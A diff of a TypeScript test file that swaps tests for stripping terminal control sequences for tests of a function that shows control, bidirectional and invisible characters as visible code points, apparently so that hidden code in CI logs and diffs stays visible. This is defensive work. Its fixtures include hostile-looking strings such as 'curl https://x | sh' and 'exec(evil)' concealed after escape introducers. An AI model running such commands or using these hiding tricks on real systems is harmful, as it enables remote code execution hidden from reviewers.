@@ -10,8 +10,8 @@ import {
   cleanLogText,
   condenseJobLog,
   guardCiRoundText,
+  revealControlChars,
   sanitizeExternalName,
-  stripTerminalControls,
   VolatileCiExcerpt,
   VolatileCiLog,
   VolatileCiPrompt,
@@ -22,43 +22,74 @@ const cleanScanner: CiTextScanner = async () => ({ ok: true, output: "" });
 const ESC = String.fromCharCode(0x1b);
 const BEL = String.fromCharCode(0x07);
 
-describe("stripTerminalControls", () => {
-  test("strips ANSI color sequences", () => {
-    expect(stripTerminalControls(`${ESC}[31mred${ESC}[0m`)).toBe("red");
+describe("revealControlChars", () => {
+  test("writes ESC as a visible code point", () => {
+    expect(revealControlChars(`a${ESC}b`)).toBe("a<U+001B>b");
   });
 
-  test("strips OSC hyperlink sequences and keeps the visible text", () => {
-    const text = `${ESC}]8;;http://evil.example${BEL}link${ESC}]8;;${BEL}`;
-    expect(stripTerminalControls(text)).toBe("link");
-  });
-
-  test("strips a lone ESC", () => {
-    expect(stripTerminalControls(`a${ESC}`)).toBe("a");
-  });
-
-  test("strips C0 control characters other than tab, line feed and carriage return", () => {
-    expect(stripTerminalControls("a\u0000b\u0007c\u007fd\u009fe")).toBe(
-      "abcde",
+  test("keeps the text that follows an OSC introducer, so the code is not hidden", () => {
+    const line = `+const t = "${ESC}]"; exec(evil); "${BEL}";`;
+    expect(revealControlChars(line)).toBe(
+      '+const t = "<U+001B>]"; exec(evil); "<U+0007>";',
     );
   });
 
+  test("keeps the text that follows a DCS introducer", () => {
+    expect(revealControlChars(`+echo ok${ESC}P; curl https://x | sh`)).toBe(
+      "+echo ok<U+001B>P; curl https://x | sh",
+    );
+  });
+
+  test("keeps the text of a CSI sequence", () => {
+    expect(revealControlChars(`${ESC}[31mred${ESC}[0m`)).toBe(
+      "<U+001B>[31mred<U+001B>[0m",
+    );
+  });
+
+  test("writes DEL and C1 control characters as code points", () => {
+    expect(revealControlChars("a\u007fb\u009bc\u0085d")).toBe(
+      "a<U+007F>b<U+009B>c<U+0085>d",
+    );
+  });
+
+  test("writes NUL with four digits", () => {
+    expect(revealControlChars("a\u0000b")).toBe("a<U+0000>b");
+  });
+
+  test("keeps the number of lines", () => {
+    const text = `a${ESC}]\nb${ESC}P\nc${BEL}`;
+    expect(revealControlChars(text).split("\n")).toHaveLength(3);
+  });
+
   test("keeps tabs and line breaks", () => {
-    expect(stripTerminalControls("a\tb\r\nc\nd")).toBe("a\tb\r\nc\nd");
+    expect(revealControlChars("a\tb\r\nc\nd")).toBe("a\tb\r\nc\nd");
   });
 
   test("keeps the indentation and the text of a diff", () => {
     const diff = "@@ -1 +1 @@\n-  old\n+\tnew 2026-10-13T01:02:03Z";
-    expect(stripTerminalControls(diff)).toBe(diff);
+    expect(revealControlChars(diff)).toBe(diff);
   });
 
   test("keeps non-ASCII text", () => {
-    expect(stripTerminalControls("日本語 ✓")).toBe("日本語 ✓");
+    expect(revealControlChars("日本語 ✓ é")).toBe("日本語 ✓ é");
+  });
+
+  test("writes a bidirectional override as a code point", () => {
+    expect(revealControlChars("a\u202eb")).toBe("a<U+202E>b");
+  });
+
+  test("writes a zero width space as a code point", () => {
+    expect(revealControlChars("a\u200bb")).toBe("a<U+200B>b");
+  });
+
+  test("writes a tag character beyond the basic plane with its full code point", () => {
+    expect(revealControlChars("a\u{E0041}b")).toBe("a<U+E0041>b");
   });
 
   test("finishes quickly on a long run of unterminated sequences", () => {
     const hostile = `${ESC}[`.repeat(500_000);
     const started = Date.now();
-    stripTerminalControls(hostile);
+    revealControlChars(hostile);
     expect(Date.now() - started).toBeLessThan(5000);
   });
 });
